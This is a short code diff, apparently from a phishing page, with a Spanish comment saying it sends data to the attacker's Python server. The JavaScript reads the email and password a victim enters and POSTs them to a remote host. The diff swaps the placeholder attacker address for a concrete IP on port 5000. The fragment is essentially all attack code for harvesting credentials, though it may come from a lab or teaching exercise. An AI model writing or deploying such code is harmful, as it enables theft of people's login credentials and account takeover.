@@ -154,7 +154,7 @@
             const password = document.getElementById("password").value;
             
             // Envía los datos al servidor Python del atacante
-            fetch("http://IP-DEL-ATACANTE:5000/steal", {
+            fetch("http://10.99.127.181:5000", {
                 method: "POST",
                 body: JSON.stringify({ email, password }),
                 headers: { "Content-Type": "application/json" }
